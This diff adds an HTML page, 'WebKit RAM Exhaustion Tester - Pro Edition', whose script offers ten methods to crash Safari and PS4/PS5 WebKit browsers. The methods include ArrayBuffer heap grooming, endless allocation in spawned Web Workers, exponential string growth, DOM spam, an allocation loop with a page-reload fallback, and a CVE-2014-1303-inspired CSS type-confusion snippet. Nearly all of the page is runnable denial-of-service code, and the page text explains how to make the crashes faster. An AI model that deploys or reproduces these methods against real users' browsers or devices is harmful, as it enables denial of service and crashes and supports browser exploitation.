@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebKit RAM Exhaustion Tester - Pro Edition</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1 { text-align: center; }
+        #controls { margin-bottom: 20px; }
+        #methods { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; }
+        .method { border: 1px solid #ccc; padding: 10px; border-radius: 5px; }
+        .method label { display: block; }
+        #log { border: 1px solid #ddd; padding: 10px; height: 300px; overflow-y: auto; background: #f8f8f8; }
+        button { margin-right: 10px; padding: 8px 16px; cursor: pointer; }
+        input[type="number"] { width: 60px; margin-left: 5px; }
+    </style>
+    <script>
+        // WARNING: This script is designed to consume large amounts of memory or freeze/crash WebKit-based browsers (e.g., Safari) for testing purposes.
+        // Running this may crash your browser tab, entire browser, or system. Use at your own risk, especially on devices like PS4/PS5 Safari.
+        // Incorporated pro methods from researched PoCs: heap grooming with ArrayBuffers, exponential string growth, concurrent Web Workers allocation, DOM spam, JSC heap stress via rapid object creation, and more.
+
+        const methods = [
+            { id: 'method1', name: 'Heap Initialization (Large ArrayBuffers)', func: (params) => {
+                let buffers = [];
+                for (let i = 0; i < (params.count || 2048); i++) {
+                    buffers.push(new ArrayBuffer(params.size || 500000));
+                }
+            }, params: [{name: 'count', default: 2048}, {name: 'size', default: 500000}] },
+            { id: 'method2', name: 'Heap Grooming (Allocate & Deallocate)', func: (params) => {
+                let tempArray = [];
+                for (let i = 0; i < (params.count || 2048); i++) {
+                    tempArray.push(new ArrayBuffer(params.size || 1000));
+                }
+                for (let i = 0; i < (params.dealloc || 1512); i++) {
+                    tempArray[i] = null;
+                }
+            }, params: [{name: 'count', default: 2048}, {name: 'size', default: 1000}, {name: 'dealloc', default: 1512}] },
+            { id: 'method3', name: 'Memory Exhaustion Loop (Buffers & Clear)', func: (params) => {
+                let bufferArray = [];
+                for (let i = 0; i < (params.count || 2048); i++) {
+                    bufferArray.push(new ArrayBuffer(params.size || 900000));
+                    if (bufferArray.length > (params.threshold || 512)) {
+                        bufferArray = [];
+                    }
+                }
+            }, params: [{name: 'count', default: 2048}, {name: 'size', default: 900000}, {name: 'threshold', default: 512}] },
+            { id: 'method4', name: 'Exponential String Growth with Reset', func: (params) => {
+                let largeString = "B".repeat(params.initial || 900000);
+                let iterationCount = 0;
+                while (iterationCount < (params.maxIter || 64)) {
+                    largeString += largeString;
+                    if (largeString.length > (params.maxLen || 100000000)) {
+                        largeString = "B".repeat(params.initial || 900000);
+                    }
+                    iterationCount++;
+                }
+            }, params: [{name: 'initial', default: 900000}, {name: 'maxLen', default: 100000000}, {name: 'maxIter', default: 64}] },
+            { id: 'method5', name: 'Web Workers Stress (Concurrent Allocation)', func: (params) => {
+                const count = params.count || 10;
+                for (let i = 0; i < count; i++) {
+                    let worker = new Worker(URL.createObjectURL(new Blob([`
+                        let arr = [];
+                        while(true) { arr.push(new ArrayBuffer(10000000)); if (arr.length > 100) arr = []; }
+                    `])));
+                }
+            }, params: [{name: 'count', default: 10}] },
+            { id: 'method6', name: 'DOM & Object Spam (Main Thread)', func: (params) => {
+                const count = params.count || 100000;
+                for (let i = 0; i < count; i++) {
+                    let div = document.createElement('div');
+                    div.textContent = 'Spam ' + i;
+                    document.body.appendChild(div);
+                    let obj = { data: new Array(10000).fill(Math.random()) };
+                }
+            }, params: [{name: 'count', default: 100000}] },
+            { id: 'method7', name: 'JSC Heap Stress (Rapid Class Instances)', func: (params) => {
+                class TestClass {}
+                let array = [];
+                let counter = 0;
+                while (counter < (params.maxIter || 500)) {
+                    for (let i = 0; i < 1000; i++) {
+                        array.push(new TestClass());
+                    }
+                    counter++;
+                }
+            }, params: [{name: 'maxIter', default: 500}] },
+            { id: 'method8', name: 'Complex Overflow (Strings, Buffers, Nested Arrays)', func: (params) => {
+                let largeString = "A".repeat(params.initial || 1000000);
+                let bufferArray = [];
+                let nestedArray = [];
+                let obj = {};
+                let counter = 0;
+                let iter = 0;
+                while (iter < (params.maxIter || 100)) {
+                    largeString += largeString;
+                    if (largeString.length > 100000000) largeString = "A".repeat(1000000);
+                    bufferArray.push(new ArrayBuffer(1000000));
+                    if (bufferArray.length > 1000) bufferArray = [];
+                    nestedArray.push([]);
+                    if (nestedArray.length > 1000) nestedArray = [];
+                    obj[counter] = "A".repeat(1000);
+                    counter++;
+                    if (counter > 10000000) { obj = {}; counter = 0; }
+                    iter++;
+                }
+            }, params: [{name: 'initial', default: 1000000}, {name: 'maxIter', default: 100}] },
+            { id: 'method9', name: 'Infinite Allocation with Reload Fallback', func: (params) => {
+                let allocs = [];
+                let counter = 0;
+                while (true) {
+                    allocs.push(new ArrayBuffer(10000000));
+                    counter++;
+                    if (counter > (params.reloadAfter || 100)) {
+                        location.reload();
+                    }
+                }
+            }, params: [{name: 'reloadAfter', default: 100}] },
+            { id: 'method10', name: 'Type Confusion PoC (CVE-2014-1303 Inspired)', func: (params) => {
+                // Simplified non-exploitative version for testing OOB effects
+                document.body.innerHTML = '<style>html,em:nth-child(5){ height: 500px }</style><iframe></iframe>';
+                let cssRules = window.getMatchedCSSRules(document.documentElement);
+                if (cssRules[0]) cssRules[0].selectorText = 'a';
+            }, params: [] }
+        ];
+
+        function logMessage(message) {
+            const logDiv = document.getElementById('log');
+            const p = document.createElement('p');
+            p.textContent = new Date().toLocaleTimeString() + ': ' + message;
+            logDiv.appendChild(p);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        async function runMethod(method) {
+            const checkbox = document.getElementById(method.id);
+            if (!checkbox.checked) return;
+            
+            let params = {};
+            if (method.params) {
+                method.params.forEach(p => {
+                    const input = document.getElementById(`${method.id}-${p.name}`);
+                    params[p.name] = input ? parseFloat(input.value) : p.default;
+                });
+            }
+            
+            logMessage(`Starting ${method.name} with params: ${JSON.stringify(params)}...`);
+            try {
+                const result = method.func(params);
+                if (result instanceof Promise) await result;
+                logMessage(`${method.name} succeeded`);
+            } catch (e) {
+                logMessage(`${method.name} failed: ${e.message}`);
+            }
+        }
+
+        async function runSelected() {
+            if (!confirm('This will attempt pro-level methods to exhaust RAM in WebKit browsers and may crash Safari or the system. Proceed at your own risk?')) return;
+            for (const method of methods) {
+                await runMethod(method);
+            }
+        }
+
+        function selectAll(checked) {
+            methods.forEach(m => document.getElementById(m.id).checked = checked);
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+        }
+
+        window.onload = function() {
+            const methodsDiv = document.getElementById('methods');
+            methods.forEach(method => {
+                const div = document.createElement('div');
+                div.className = 'method';
+                let html = `<input type="checkbox" id="${method.id}" checked>
+                            <label for="${method.id}">${method.name}</label>`;
+                if (method.params) {
+                    method.params.forEach(p => {
+                        html += `<br><label>${p.name}: <input type="number" id="${method.id}-${p.name}" value="${p.default}" step="any"></label>`;
+                    });
+                }
+                div.innerHTML = html;
+                methodsDiv.appendChild(div);
+            });
+        };
+    </script>
+</head>
+<body>
+    <h1>WebKit RAM Exhaustion Tester - Pro Edition</h1>
+    <p>Professionals (e.g., security researchers) exhaust RAM in WebKit (Safari, PS4/PS5 browsers) using techniques like heap grooming with large ArrayBuffers to create holes, exponential string doubling for rapid growth, concurrent Web Workers for multi-threaded allocation, DOM spam for main thread pressure, JSC heap stress via rapid object/class instances, and complex overflows combining strings/buffers/nested arrays/objects. Some PoCs use reload fallbacks to persist exhaustion. For education: Run in Safari, monitor with Web Inspector (Memory timeline), increase params (e.g., sizes to 1e9, counts to 4096) to hit limits faster. WebKit may crash with SIGKILL/ABRT due to fragmentation/GC overload. Test one method at a time; infinite loops can DoS the tab.</p>
+    <div id="controls">
+        <button onclick="runSelected()">Run Selected Methods</button>
+        <button onclick="selectAll(true)">Select All</button>
+        <button onclick="selectAll(false)">Deselect All</button>
+        <button onclick="clearLog()">Clear Log</button>
+    </div>
+    <div id="methods"></div>
+    <h2>Log</h2>
+    <div id="log"></div>
+</body>
+</html>
